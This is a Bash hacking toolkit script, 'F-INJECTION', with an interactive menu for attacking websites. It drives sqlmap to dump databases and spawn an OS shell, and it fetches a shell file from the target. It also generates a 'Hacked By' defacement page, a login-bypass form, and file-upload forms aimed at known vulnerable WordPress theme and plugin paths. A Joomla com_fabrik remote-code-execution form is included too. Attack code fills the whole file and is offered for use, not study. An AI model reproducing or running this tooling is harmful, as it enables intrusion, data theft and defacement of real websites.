clear                                                                                                                    
red='\e[1;31m'                                                                                                           
green='\e[1;32m'                                                                                                         
blue='\e[1;34m'                                                                                                          
purple='\e[1;35m'                                                                                                        
cyan='\e[1;36m'
white='\e[1;37m'
yellow='\e[1;33m'
Dd='"'
yy='/'
De='"'
a='"center"'
aaa='"#111111"'
b='"100%"'
bb='""'
c='"0"'
d='"align"'
e='"#000000"'
f='"10"'
gg='"1"'
h='"#ffffff"'
hh='"#b21f25"'
hhh='"#333333"'
loc1='/server/php/files/shell.php'
loc2='/lazyseo.php'
dr2='/wp-content/plugins/lazy-seo'
dr4='/examples/uploadbutton.html'
loc3='/js/upload.php'
dr1='/wp-content/themes/multimedia1'
dr3='/wp-content/themes/rehber'
dr0day='/index.php/?include=Overview.html'
exploit0day='/main/inc/lib/fckeditor/editor/plugins/ImageManager/manager.php'
lloc=$dr1$loc1
lloc2=$dr2$loc2
lloc3=$dr3$loc3
lloc4=$dr4
SCORE="0"
AVERAGE="0"
SUM="0"
NUM="0"
dorkrcebot='viewtable?cid= site:com'
exploitrce='/index.php?option=com_fabrik&c=import&view=import&fietype=csv&tableid=0&Itemid=0'
pathindexrce='/media/index.php'
fds='f4ab596c43b9c5879167bd32b1eba738  -'
gre='7779215fc3e8baa5317dc8bc8f6332c9  -'
echo -e $green '--------------------------------------------------'
figlet -f smmono12 "Login ==>"
echo -e $green '|'       $red 'CopyRight </> Mohammed Info |'
echo -e $white '|'       $green ' From : Yemen.                                               |'
echo -e $green '--------------------{ Login To f-injection}---------------------'
echo -e $yellow "======>please insert the user name "
echo -e $green'┌─[• F-INJECTION •]'
echo -e $red'|'
read -p "└────────►" usern
echo -e $yellow '+++++++++++++++++++++++++++++++++'
echo -e $green '| User Name  |' $usern
echo -e $yellow '+++++++++++++++++++++++++++++++++'
echo ""
echo -e $yellow "======>please insert the password "
echo -e $green'┌─[• F-INJECTION •]'
echo -e $red'|'
read -p "└────────►" passwd
echo -e $yellow '+++++++++++++++++++++++++++++++++'
echo -e $green '| Password  |' $passwd
echo -e $yellow '+++++++++++++++++++++++++++++++++'
md5=$passwd
hash="$(echo -n "$md5" | md5sum )"
ffh=$hash
tr=$ffh|md5sum
if [ $usern = "root" ]
then
clear
echo ''
echo ''
echo -e $green '+--------------------------------------------------------+'
echo -e $red '+                                                        +'
figlet -f smmono12 "F-Inj Sqlmap"
echo -e $white '+                                                        +'
echo -e $yellow '+        Hacker \ Mohammed Info                          +'
echo -e $red '+          ///,        ////                              +'
echo -e $white '+          \  /,      /  >.                              +'
echo -e $green '+           \  /,   _/  /.                               +'
echo -e $red '+            \_  /_/   /.                                +'
echo -e $yellow '+             \__/_   <    F.Injection                   +'
echo -e $white '+              /<<< \_\_      Yemen                      +'
echo -e $green '+             /,)^>>_._ \                                +'
echo -e $red '+             (/   \\ /\\\                                 +'
echo -e $white '+                   // ````                              +'
echo -e $red '+           ======((`=======                             +'
echo -e $green '---------------------------------------------------------+'
echo -e $green '      ┏┫ github.com/profionaldhim ┣┓'
echo -e $red   '      ╚ ═══ ══ ══ ═══ ══ ══  ══ ══ ╝'
echo -e $green '      ╚═┫whatsapp :+967733014747╠═╝'
echo ""
echo -e $yellow "    By =====> $red HACKER / MOHAMMED Info "
echo ''
echo -e $green   "        {-1-} Injection Sqlmap"
echo ""
echo -e $green   "        {-2-} Install SqlMap"
echo ""
echo -e $green   "        {-3-} Create Index"
echo ""
echo -e $green   "        {-4-} Exploit bypass "
echo ""
echo -e $green   "        {-5-} upload shell to word press"
echo ""
echo -e $green   "        {-6-} add url to list"
echo ""
echo -e $green   "        {-7-} read website from the list"
echo ""
echo -e $green   "        {-8-} Exploit RCE BOT"
echo ""
echo -e $green   "        {-9-} Exploit Zero Day (0day)"
echo ""
echo -e $green   "        {-10-} About me"
echo ""
echo -e $green   "        {-0-} EXIT |-|"
echo ""
echo ""
echo -e $green "Enter The Number:"
echo -e $red
echo ""
echo -e $green'┌─[• F-INJECTION •]'
echo -e $red'|'
read -p "└────────►" name
if [ $name = 1 ]
then
clear
echo ''
echo ''-e $green '+--------------------------------------------------------+'
echo -e $red '+                                                        +'
figlet -f smmono12 "F-Inj Sqlmap"
echo -e $white '+                                                        +'
echo -e $yellow '+        Hacker \ Mohammed Info                          +'
echo -e $red '+          ///,        ////                              +'
echo -e $white '+          \  /,      /  >.                              +'
echo -e $green '+           \  /,   _/  /.                               +'
echo -e $red '+            \_  /_/   /.                                +'
echo -e $yellow '+             \__/_   <    F.Injection                   +'
echo -e $white '+              /<<< \_\_      Yemen                      +'
echo -e $green '+             /,)^>>_._ \                                +'
echo -e $red '+             (/   \\ /\\\                                 +'
echo -e $white '+                   // ````                              +'
echo -e $red '+           ======((`=======                             +'
echo -e $green '---------------------------------------------------------+'
echo -e $green '      ┏┫ github.com/profionaldhim ┣┓'
echo -e $red   '      ╚ ═══ ══ ══ ══  ══ ══ ══  ══ ╝'
echo -e $green '      ╚═┫whatsapp :+967733014747╠═╝'
echo ""
echo ""
echo -e $yellow "    By =====> $red HACKER / MOHAMMED Info "
echo ''
cd ~
cd sqlmap
echo ""
echo -e $greeb "Do you want Fast Injection insert y or n?"
echo -e $green'┌─[• F-INJECTION •]'
echo -e $red'|'
read -p "└────────►" fast
if [ $fast = "y" ]
then
echo -e $yellow '+++++++++++++++++++++++++'
echo -e $green '+ please insert web url +'
echo -e $red '++++++++++++++++++++++'
echo -e $green'┌─[• F-INJECTION •]'
echo -e $red'|'
read -p "└────────►" urr
echo ""
echo ""
python2 sqlmap.py -u $urr --batch
echo -e $yellow '++++++++++++++++++++++++++++++++++++++++++++++'
echo -e $greeng '| the root |'                               '|'
python2 sqlmap.py -u $urr --current-user --is-dba
echo -e $yellow '++++++++++++++++++++++++++++++++++++++++++++++'
python2 sqlmap.py -u $urr --os-shell
wget $urr'/shell.txt' -o shell.php
else
echo -e $yellow '+++++++++++++++++++++++++'
echo -e $green '+ please insert web url +'
echo -e $red '+++++++++++++++++++++++++'
echo -e $green'┌─[• F-INJECTION •]'
echo -e $red'|'
read -p "└────────►" re
python2 sqlmap.py -u $re --dbs
echo -e $green '-----------------------------------------------------------------'
echo -e $white '+  URL WEBSITE                     +   Database +  Table        +'
echo -e $white '+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'
echo -e $white '+                                  +            +               +'
echo -e $white '+'$re' + ' '   + ''     +'
echo -e $white '+---------------------------------------------------------------+'
echo ""
echo -e $yellow '++++++++++++++++++++++++++++++'
echo -e $green '+ please insert web Database +'
echo -e $red '++++++++++++++++++++++++++++++'
echo -e $green'┌─[• F-INJECTION •]'
echo -e $red'|'
read -p "└────────►" data
python2 sqlmap.py -u $re -D $data --tables
echo -e $green '-----------------------------------------------------------------'
echo -e $white '+  URL WEBSITE                     +   Database +  Table        +'
echo -e $white '+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'
echo -e $white '+                                  +            +               +'
echo -e $white '+'$re' + '$data '   + ''     +'
echo -e $white '+---------------------------------------------------------------+'
echo ""
echo ""
echo -e $yellow '+++++++++++++++++++++++++++'
echo -e $green '+ please insert web Table +'
echo -e $red '+++++++++++++++++++++++++++'
echo -e $green'┌─[• F-INJECTION •]'
echo -e $red'|'
read -p "└────────►" table
python2 sqlmap.py -u $re -D $data -T $table --columns
echo -e $green '-----------------------------------------------------------------'
echo -e $white '+  URL WEBSITE                     +   Database +  Table        +'
echo -e $white '+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'
echo -e $white '+                                  +           +               +'
echo -e $white '+'$re' + '$data '   + '$table'     +'
echo -e $white '+---------------------------------------------------------------+'
echo ""
echo ""
echo -e $yellow '+++++++++++++++++++++++++++++'
echo -e $green '+ please insert web Columns +'
echo -e $red '+++++++++++++++++++++++++++++'
echo -e $green'┌─[• F-INJECTION •]'
echo -e $red'|'
read -p "└────────►" columns
echo -e $green '------------------------------------------------------------------------------+'
echo -e $white '+  URL WEBSITE                     +   Database +  Table       + columns +'
echo -e $white '+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'
echo -e $white '+                                  +            +               +'
echo -e $white '+'$re' + '$data '   + '$columns'   +'
echo -e $white '+-----------------------------------------------------------------------------+'
echo ""
python2 sqlmap.py -u $re -D $data -T $table -C $columns --dump
echo -e $yellow "Do you want extract shell path y/n "
echo -e $green'┌─[• F-INJECTION •]'
echo -e $red'|'
read -p "└────────►" shell
if [ $shell = "y" ]
then
python2 sqlmap.py -u $re --batch
echo -e $yellow '++++++++++++++++++++++++++++++++++++++++++++++'
echo -e $greeng '| the root |'                                '|'
python2 sqlmap.py -u $re --current-user
echo -e $yellow '++++++++++++++++++++++++++++++++++++++++++++++'
python2 sqlmap.py -u $rel --os-shell
wget $re'/shell.txt' -o shell.php
fi
fi
echo -e $yellow "Do you want define type hash insert y/n "
echo -e $green'┌─[• F-INJECTION •]'
echo -e $red'|'
read -p "└────────►" typehash
if [ $typehash = "y" ]
then
clear
cd $Home
cd hash-identifier.py
python2 hash-identifier.py
else
bash Fastinjection.sh
fi
fi
if [ $name = 2 ]
then
clear
cd $Home
git clone https://github.com/sqlmapproject/sqlmap
fi
if [ $name = 3 ]
then
clear
echo ''
echo ''-e $green '+--------------------------------------------------------+'
echo -e $red '+                                                        +'
figlet -f smmono12 "F-Inj Sqlmap"
echo -e $white '+                                                        +'
echo -e $yellow '+        Hacker \ Mohammed Info                          +'
echo -e $red '+          ///,        ////                              +'
echo -e $white '+          \  /,      /  >.                              +'
echo -e $green '+           \  /,   _/  /.                               +'
echo -e $red '+            \_  /_/   /.                                +'
echo -e $yellow '+             \__/_   <    F.Injection                   +'
echo -e $white '+              /<<< \_\_      Yemen                      +'
echo -e $green '+             /,)^>>_._ \                                +'
echo -e $red '+             (/   \\ /\\\                                 +'
echo -e $white '+                   // ````                              +'
echo -e $red '+           ======((`=======                             +'
echo -e $green '---------------------------------------------------------+'
echo -e $green '      ┏┫ github.com/profionaldhim ┣┓'
echo -e $red   '      ╚ ═══ ══ ══ ══  ══ ══ ══  ══ ╝'
echo -e $green '      ╚═┫whatsapp :+967733014747╠═╝'
echo ""
echo ""
echo -e $yellow "    By =====> $red HACKER / MOHAMMED Info "
echo ''
echo -e $yellow '+++++++++++++++++++++++++'
echo -e $green '+ please insert img url +'
echo -e $red '+++++++++++++++++++++++++'
echo -e $green'┌─[• F-INJECTION •]'
echo -e $red'|'
read -p "└────────►" imgurl
echo ""
echo ""
echo -e $yellow '+++++++++++++++++++++++'
echo -e $green '+ please insert Title +'
echo -e $red '+++++++++++++++++++++++'
echo -e $green'┌─[• F-INJECTION •]'
echo -e $red'|'
read -p "└────────►" title
echo ""
echo ""
echo -e $yellow '++++++++++++++++++++++++++++++'
echo -e $green '+ please insert Height image +'
echo -e $red '++++++++++++++++++++++++++++++'
echo -e $green'┌─[• F-INJECTION •]'
echo -e $red'|'
read -p "└────────►" Height
echo ""
echo ""
echo -e $yellow '+++++++++++++++++++++++++++++'
echo -e $green '+ please insert Width image +'
echo -e $red '+++++++++++++++++++++++++++++'
echo -e $green'┌─[• F-INJECTION •]'
echo -e $red'|'
read -p "└────────►" Width
echo ""
echo ""
echo -e $yellow '+++++++++++++++++++++++++++'
echo -e $green '+ please insert Hacked By +'
echo -e $red '+++++++++++++++++++++++++++'
echo -e $green'┌─[• F-INJECTION •]'
echo -e $red'|'
read -p "└────────►" hacked
echo ""
echo ""
echo -e $yellow '+++++++++++++++++++++++++'
echo -e $green '+ please insert MESSEGE +'
echo -e $red '+++++++++++++++++++++++++'
echo -e $green'┌─[• F-INJECTION •]'
echo -e $red'|'
read -p "└────────►" messege
echo ""
echo ""
echo -e $yellow '++++++++++++++++++++++'
echo -e $green '+ please insert Team +'
echo -e $red '++++++++++++++++++++++'
echo -e $green'┌─[• F-INJECTION •]'
echo -e $red'|'
read -p "└────────►" team
echo ""
echo ""
rm -rif output/index.html
touch output/index.html
echo "<body bgcolor=black>\n" >> output/index.html
echo "\n" >> output/index.html
echo "<br><title>"$title"</title></br>\n" >> output/index.html
echo "<td><div align="$a">\n" >> output/index.html
echo "</div>        <table width="$b" border="$c" cellpadding="$c" cellspacing="$c">\n" >> output/index.html
echo "          <tbody><tr>\n" >> output/index.html
echo "     <center><img src="$Dd""$imgurl""$Dd" alt="$bb" width="$aa""$Width""$aa" height="$aa""$Height""$aa" align="$d"></a></center>\n">> output/index.html
echo "          </tr>\n" >> output/index.html
echo "        </tbody></table>\n" >> output/index.html
echo "<table width="$b" bgcolor="$e" border="$c"cellpadding="$f" cellspacing="$gg">\n" >> output/index.html
echo "\n" >> output/index.html
echo "  <tbody><tr bgcolor="$h">\n" >> output/index.html
echo "    <td bgcolor="$h"><center><b><font color="$hh">Hacked By "$hacked"</font></b></center></td>\n" >> output/index.html
echo "\n" >> output/index.html
echo "  </tr>\n" >> output/index.html
echo "\n" >> output/index.html
echo "  <tr bgcolor="$hhh">\n" >> output/index.html
echo "    <td bgcolor="$aaa"><center><center><font color="$hh"><b><br>"$messege"</center>\n" >> output/index.html
echo "      <br><center>"$team"</b></center>\n" >> output/index.html
echo "\n" >> output/index.html
echo "\n" >> output/index.html
echo "   </td></tr><tr bgco" >> output/index.html
echo -e $yellow "Do you want cp index html to sdcard y/n "
echo -e $green'┌─[• F-INJECTION •]'
echo -e $red'|'
read -p "└────────►" cindex
if [ $cindex = "y" ]
then
cp output/index.html /sdcard
bash Fastinjection.sh
fi
fi
if [ $name = 4 ]
then
clear
echo ''
echo -e $green '+--------------------------------------------------------+'
echo -e $red '+                                                        +'
figlet -f smmono12 "F-Inj Sqlmap"
echo -e $white '+                                                        +'
echo -e $yellow '+        Hacker \ Mohammed Info                          +'
echo -e $red '+          ///,        ////                              +'
echo -e $white '+          \  /,      /  >.                              +'
echo -e $green '+           \  /,   _/  /.                               +'
echo -e $red '+            \_  /_/   /.                                +'
echo -e $yellow '+             \__/_   <    F.Injection                   +'
echo -e $white '+              /<<< \_\_      Yemen                      +'
echo -e $green '+             /,)^>>_._ \                                +'
echo -e $red '+             (/   \\ /\\\                                 +'
echo -e $white '+                   // ````                              +'
echo -e $red '+           ======((`=======                             +'
echo -e $green '---------------------------------------------------------+'
echo -e $green '      ┏┫ github.com/profionaldhim ┣┓'
echo -e $red   '      ╚ ═══ ══ ══ ══  ══ ══ ══  ══ ╝'
echo -e $green '      ╚═┫whatsapp :+967733014747╠═╝'
echo ""
echo ""
echo -e $yellow "    By =====> $red HACKER / MOHAMMED Info "
echo ''
echo -e $green '=' $red '==' $green '>>'$white "~~ Please Insert URL WEBSITE "
echo ""
echo ""
echo -e $green'┌─[• F-INJECTION •]'
echo -e $red'|'
read -p "└────────►" url2
echo ""
echo ""
echo -e $green '=' $red '==' $green '>>'$white "~~ Please Insert USERNAME  "
echo -e $green'┌─[• F-INJECTION •]'
echo -e $red'|'
read -p "└────────►" user
echo ""
echo ""
echo -e $green '=' $red '==' $green '>>'$white "~~ Please Insert PASSWORD (bypass)"
echo -e $green'┌─[• F-INJECTION •]'
echo -e $red'|'
read -p "└────────►" pass
echo ""
echo ""
echo -e $green '=' $red '==' $green '>>'$white "~~ Please Insert path Admin to login"
echo -e $green'┌─[• F-INJECTION •]'
echo -e $red'|'
read -p "└────────►" pathlogin
echo ""
echo ""
echo -e $green '-----------------------------------------------------------------'
echo -e $white '+  URL WEBSITE                     +   USERNAME +  PASSWORD     +'
echo -e $white '+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'
echo -e $white '+                                  +            +               +'
echo -e $white '+'$url2' + '$user '   + '$pass'     +'
echo -e $white '+---------------------------------------------------------------+'
rm -rif output/Fast-Hack.html
touch output/Fast-Hack.html
echo "<html>" >> output/Fast-Hack.html
echo "<body>" >> output/Fast-Hack.html
echo "<form method="'"post"'" action="$Dd$url2$yy$pathlogin$Dd">" >> output/Fast-Hack.html
echo "<input type="'"hidden"'" name="'"user login"'"  value="$Dd$user$Dd">" >> output/Fast-Hack.html
echo "<input type="'"hidden"'" name="'"user password"'"  value="$Dd$pass$Dd">" >> output/Fast-Hack.html
echo ""
echo "<input type="'"submit"'" value="'"Hack"'">" >> output/Fast-Hack.html
echo "</form>" >> output/Fast-Hack.html
echo "</body>" >> output/Fast-Hack.html
echo "</html>" >> output/Fast-Hack.html
echo -e $green "do u want save and copy to sdcard ?? y/n"
echo -e $green'┌─[• F-INJECTION •]'
echo -e $red'|'
read -p "└────────►" script
if [ $script = "y" ]
then
cp output/Fast-Hack.html /sdcard
bash Fastinjection.sh
fi
fi
if [ $name = 5 ]
then
clear
echo ''
echo -e $green '+--------------------------------------------------------+'
echo -e $red '+                                                        +'
figlet -f smmono12 "F-Inj Sqlmap"
echo -e $white '+                                                        +'
echo -e $yellow '+        Hacker \ Mohammed Info                          +'
echo -e $red '+          ///,        ////                              +'
echo -e $white '+          \  /,      /  >.                              +'
echo -e $green '+           \  /,   _/  /.                               +'
echo -e $red '+            \_  /_/   /.                                +'
echo -e $yellow '+             \__/_   <    F.Injection                   +'
echo -e $white '+              /<<< \_\_      Yemen                      +'
echo -e $green '+             /,)^>>_._ \                                +'
echo -e $red '+             (/   \\ /\\\                                 +'
echo -e $white '+                   // ````                              +'
echo -e $red '+           ======((`=======                             +'
echo -e $green '---------------------------------------------------------+'
echo -e $green '      ┏┫ github.com/profionaldhim ┣┓'
echo -e $red   '      ╚ ═══ ══ ══ ══  ══ ══ ══  ══ ╝'
echo -e $green '      ╚═┫whatsapp :+967733014747╠═╝'
echo ""
echo ""
echo -e $yellow "    By =====> $red HACKER / MOHAMMED Info "
echo ''
echo ""
echo -e $green   "        {-1- inurl:} "$dr1
echo ""
echo -e $green   "        {-2- inurl:} "$dr2
echo ""
echo -e $green   "        {-3- inurl:} "$dr3
echo ""
echo -e $green   "        {-4- inurl:} "$dr4
echo ""
echo -e $green   "        {-5- inurl:}  other dork"
echo ""
echo ""
echo -e $green   "        {-00-} back"
echo ""
echo -e $green'┌─[• F-INJECTION •]'
echo -e $red'|'
read -p "└────────►" check
if [ $check = 1 ]
then
echo ""
echo -e $yellow '+++++++++++++++++++++++++'
echo -e $green '+ please insert web url +'
echo -e $red '++++++++++++++++++++++'
echo -e $green'┌─[• F-INJECTION •]'
echo -e $red'|'
read -p "└────────►" ur1
echo ""
echo ""
echo -e $yellow '++++++++++++++++++++++++++++++++++++++++++++++'
echo -e $green '|  URL |' $ur1 '|'
echo -e $yellow '++++++++++++++++++++++++++++++++++++++++++++++'
echo ""
echo -e $green '-----------------------------------------------------------------'
echo -e $white '|  URL WEBSITE                     |   Dork        |'
echo -e $white '+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'
echo -e $white '|                                  |                           |'
echo -e $white '|'$ur1' | ' $dr1$loc1'     |'
echo -e $white '+---------------------------------------------------------------|'
echo ""
exp=$lloc
echo -e $yellow '+++++++++++++++++++++++++'
echo -e $green '+ location :-'$ur1$exp'+'
echo -e $red '++++++++++++++++++++++'
rm -rif output/upload-shell.html
touch output/upload-shell.html
echo "<html>" >> output/upload-shell.html
echo "<body>" >> output/upload-shell.html
echo "<form enctype=""multipart/form-data"" action="$Dd$ur1$exp$Dd "method="$Dd"post"$Dd'>' >> output/upload-shell.html
echo "<input name="$Dd"files=[]"$Dd "type="$Dd"file"$Dd '/><br />' >> output/upload-shell.html
echo ""
echo "<input type="'"submit"'" value="'"Hack"'">" >> output/upload-shell.html
echo "</form>" >> output/upload-shell.html
echo "</body>" >> output/upload-shell.html
echo "</html>" >> output/upload-shell.html
echo -e $green "do u want save and copy to sdcard ?? y/n"
echo -e $green'┌─[• F-INJECTION •]'
echo -e $red'|'
read -p "└────────►" script1
if [ $script1 = "y" ]
then
cp output/upload-shell.html /sdcard
bash Fastinjection.sh
fi
fi
if [ $check = 2 ]
then
echo ""
echo -e $yellow '+++++++++++++++++++++++++'
echo -e $green '+ please insert web url +'
echo -e $red '++++++++++++++++++++++'
echo -e $green'┌─[• F-INJECTION •]'
echo -e $red'|'
read -p "└────────►" ur2
echo ""
echo ""
echo -e $yellow '++++++++++++++++++++++++++++++++++++++++++++++'
echo -e $green '|  URL |' $ur1 '|'
echo -e $yellow '++++++++++++++++++++++++++++++++++++++++++++++'
echo ""
echo -e $green '-----------------------------------------------------------------'
echo -e $white '|  URL WEBSITE                     |   Dork        |'
echo -e $white '+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'
echo -e $white '|                                  |                           |'
echo -e $white '|'$ur2' | ' $dr2$loc2'     |'
echo -e $white '+---------------------------------------------------------------|'
echo ""
echo -e $yellow '+++++++++++++++++++++++++'
echo -e $green '+ location :-'$ur2$lloc2'+'
echo -e $red '++++++++++++++++++++++'
rm -rif output/upload-shell.html
touch output/upload-shell.html
echo "<html>" >> output/upload-shell.html
echo "<body>" >> output/upload-shell.html
echo "<form enctype=""multipart/form-data"" action="$Dd$ur2$lloc2$Dd "method="$Dd"post"$Dd'>' >> output/upload-shell.html
echo "<input name="$Dd"files=[]"$Dd "type="$Dd"file"$Dd '/><br />' >> output/upload-shell.html
echo ""
echo "<input type="'"submit"'" value="'"Hack"'">" >> output/upload-shell.html
echo "</form>" >> output/upload-shell.html
echo "</body>" >> output/upload-shell.html
echo "</html>" >> output/upload-shell.html
echo -e $green "do u want save and copy to sdcard ?? y/n"
echo -e $green'┌─[• F-INJECTION •]'
echo -e $red'|'
read -p "└────────►" script2
if [ $script2 = "y" ]
then
cp output/upload-shell.html /sdcard
bash Fastinjection.sh
fi
fi
if [ $check = 3 ]
then
echo ""
echo -e $yellow '+++++++++++++++++++++++++'
echo -e $green '+ please insert web url +'
echo -e $red '++++++++++++++++++++++'
echo -e $green'┌─[• F-INJECTION •]'
echo -e $red'|'
read -p "└────────►" ur3
echo ""
echo ""
echo -e $yellow '++++++++++++++++++++++++++++++++++++++++++++++'
echo -e $green '|  URL |' $ur3 '|'
echo -e $yellow '++++++++++++++++++++++++++++++++++++++++++++++'
echo ""
echo -e $green '-----------------------------------------------------------------'
echo -e $white '|  URL WEBSITE                     |   Dork        |'
echo -e $white '+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'
echo -e $white '|                                  |                           |'
echo -e $white '|'$ur3' | ' $dr3$loc3'     |'
echo -e $white '+---------------------------------------------------------------|'
echo ""
echo -e $yellow '+++++++++++++++++++++++++'
echo -e $green '+ location :-'$ur3$lloc3'+'
echo -e $red '++++++++++++++++++++++'
rm -rif output/upload-shell.html
touch output/upload-shell.html
echo "<html>" >> output/upload-shell.html
echo "<body>" >> output/upload-shell.html
echo "<form enctype=""multipart/form-data"" action="$Dd$ur3$lloc3$Dd "method="$Dd"post"$Dd'>' >> output/upload-shell.html
echo "<input name="$Dd"files=[]"$Dd "type="$Dd"file"$Dd '/><br />' >> output/upload-shell.html
echo ""
echo "<input type="'"submit"'" value="'"Hack"'">" >> output/upload-shell.html
echo "</form>" >> output/upload-shell.html
echo "</body>" >> output/upload-shell.html
echo "</html>" >> output/upload-shell.html
echo -e $green "do u want save and copy to sdcard ?? y/n"
echo -e $green'┌─[• F-INJECTION •]'
echo -e $red'|'
read -p "└────────►" script3
if [ $script3 = "y" ]
then
cp output/upload-shell.html /sdcard
bash Fastinjection.sh
fi
fi
if [ $check = 4 ]
then
echo ""
echo -e $yellow '+++++++++++++++++++++++++'
echo -e $green '+ please insert web url +'
echo -e $red '++++++++++++++++++++++'
echo -e $green'┌─[• F-INJECTION •]'
echo -e $red'|'
read -p "└────────►" ur4
echo ""
echo ""
echo -e $yellow '++++++++++++++++++++++++++++++++++++++++++++++'
echo -e $green '|  URL |' $ur4 '|'
echo -e $yellow '++++++++++++++++++++++++++++++++++++++++++++++'
echo ""
echo -e $green '-----------------------------------------------------------------'
echo -e $white '|  URL WEBSITE                     |   Dork        |'
echo -e $white '+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'
echo -e $white '|                                  |                           |'
echo -e $white '|'$ur4' | ' $dr4'     |'
echo -e $white '+---------------------------------------------------------------|'
echo ""
echo -e $yellow '+++++++++++++++++++++++++'
echo -e $green '+ location :-'$ur4$dr4'+'
echo -e $red '++++++++++++++++++++++'
rm -rif output/upload-shell.html
touch output/upload-shell.html
echo "<html>" >> output/upload-shell.html
echo "<body>" >> output/upload-shell.html
echo "<form enctype=""multipart/form-data"" action="$Dd$ur4$dr4$Dd "method="$Dd"post"$Dd'>' >> output/upload-shell.html
echo "<input name="$Dd"files=[]"$Dd "type="$Dd"file"$Dd '/><br />' >> output/upload-shell.html
echo ""
echo "<input type="'"submit"'" value="'"Hack"'">" >> output/upload-shell.html
echo "</form>" >> output/upload-shell.html
echo "</body>" >> output/upload-shell.html
echo "</html>" >> output/upload-shell.html
echo -e $green "do u want save and copy to sdcard ?? y/n"
echo -e $green'┌─[• F-INJECTION •]'
echo -e $red'|'
read -p "└────────►" script4
if [ $script4 = "y" ]
then
cp output/upload-shell.html /sdcard
bash Fastinjection.sh
fi
fi
if [ $check = 00 ]
then
clear
bash Fastinjection.sh
fi
fi
if [ $name = 6 ]
then
clear
echo ''
echo ''
echo -e $green '+--------------------------------------------------------+'
echo -e $red '+                                                        +'
figlet -f smmono12 "F-Inj Sqlmap"
echo -e $white '+                                                        +'
echo -e $yellow '+        Hacker \ Mohammed Info                          +'
echo -e $red '+          ///,        ////                              +'
echo -e $white '+          \  /,      /  >.                              +'
echo -e $green '+           \  /,   _/  /.                               +'
echo -e $red '+            \_  /_/   /.                                +'
echo -e $yellow '+             \__/_   <    F.Injection                   +'
echo -e $white '+              /<<< \_\_      Yemen                      +'
echo -e $green '+             /,)^>>_._ \                                +'
echo -e $red '+             (/   \\ /\\\                                 +'
echo -e $white '+                   // ````                              +'
echo -e $red '+           ======((`=======                             +'
echo -e $green '---------------------------------------------------------+'
echo -e $green '      ┏┫ github.com/profionaldhim ┣┓'
echo -e $red   '      ╚ ═══ ══ ══ ══  ══ ══ ══  ══ ╝'
echo -e $green '      ╚═┫whatsapp :+967733014747╠═╝'
echo ""
echo ""
echo -e $yellow "    By =====> $red HACKER / MOHAMMED Info "
echo ''
while true; do
echo -n "add url website ex : www.google.com] ('q'for quit): "
read -p "insert :>" SC
echo $SC >> web-list.txt
done
fi
if [ $name = 7 ]
then
file="web-list.txt"
while IFS= read -r line
do
echo "$line"
done <"$file"
echo -e $green'┌─[• F-INJECTION •]'
echo -e $red'|'
read -p "└────────►" readd
fi
if [ $name = 8 ]
then
clear
echo ''
echo ''-e $green '+--------------------------------------------------------+'
echo -e $red '+                                                        +'
figlet -f smmono12 "F-Inj Sqlmap"
echo -e $white '+                                                        +'
echo -e $yellow '+        Hacker \ Mohammed Info                          +'
echo -e $red '+          ///,        ////                              +'
echo -e $white '+          \  /,      /  >.                              +'
echo -e $green '+           \  /,   _/  /.                               +'
echo -e $red '+            \_  /_/   /.                                +'
echo -e $yellow '+             \__/_   <    F.Injection                   +'
echo -e $white '+              /<<< \_\_      Yemen                      +'
echo -e $green '+             /,)^>>_._ \                                +'
echo -e $red '+             (/   \\ /\\\                                 +'
echo -e $white '+                   // ````                              +'
echo -e $red '+           ======((`=======                             +'
echo -e $green '---------------------------------------------------------+'
echo -e $green '      ┏┫ github.com/profionaldhim ┣┓'
echo -e $red   '      ╚ ═══ ══ ══ ══  ══ ══ ══  ══ ╝'
echo -e $green '      ╚═┫whatsapp :+967733014747╠═╝'
echo ""
echo ""
echo -e $yellow "    By =====> $red HACKER / MOHAMMED Info "
echo -e $yellow '+++++++++++++++++++++++++'
echo -e $green '+ please insert web url +'
echo -e $red '++++++++++++++++++++++'
echo -e $green'┌─[• F-INJECTION •]'
echo -e $red'|'
read -p "└────────►" urlrce
echo ""
echo ""
echo -e $yellow '++++++++++++++++++++++++++++++++++++++++++++++'
echo -e $green '|  URL |' $urlrce '|'
echo -e $yellow '++++++++++++++++++++++++++++++++++++++++++++++'
echo ""
echo -e $green '-----------------------------------------------------------------'
echo -e $white '|  URL WEBSITE                     |   Dork        |'
echo -e $white '+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'
echo -e $white '|                                  |                           |'
echo -e $white '|'$urlrce' | ' $exploitrce'     |'
echo -e $white '+---------------------------------------------------------------|'
echo ""
echo -e $yellow '+++++++++++++++++++++++++'
echo -e $green '+ location :-'$urlrce$exploitrce'+'
echo -e $red '++++++++++++++++++++++'
rm -rif output/RCE-Hack.html
touch output/RCE-Hack.html
echo "<html>" >> output/RCE-Hack.html
echo "<body>" >> output/RCE-Hack.html
echo "<form method="'"post"'" action="$Dd$urlrce$exploitrce$Dd'>' >> output/RCE-Hack.html
echo ""
echo "<input type="'"submit"'" value="'"Hack"'">" >> output/RCE-Hack.html
echo "</form>" >> output/RCE-Hack.html
echo "</body>" >> output/RCE-Hack.html
echo "</html>" >> output/RCE-Hack.html
echo -e $green "do u want save and copy to sdcard ?? y/n"
read -p "insert :>" cprce
if [ $cprce = "y" ]
then
cp output/RCE-Hack.html /sdcard
bash Fastinjection.sh
fi
fi
if [ $name = 9 ]
then
clear
echo ''
echo ''-e $green '+--------------------------------------------------------+'
echo -e $red '+                                                        +'
figlet -f smmono12 "F-Inj Sqlmap"
echo -e $white '+                                                        +'
echo -e $yellow '+        Hacker \ Mohammed Info                          +'
echo -e $red '+          ///,        ////                              +'
echo -e $white '+          \  /,      /  >.                              +'
echo -e $green '+           \  /,   _/  /.                               +'
echo -e $red '+            \_  /_/   /.                                +'
echo -e $yellow '+             \__/_   <    F.Injection                   +'
echo -e $white '+              /<<< \_\_      Yemen                      +'
echo -e $green '+             /,)^>>_._ \                                +'
echo -e $red '+             (/   \\ /\\\                                 +'
echo -e $white '+                   // ````                              +'
echo -e $red '+           ======((`=======                             +'
echo -e $green '---------------------------------------------------------+'
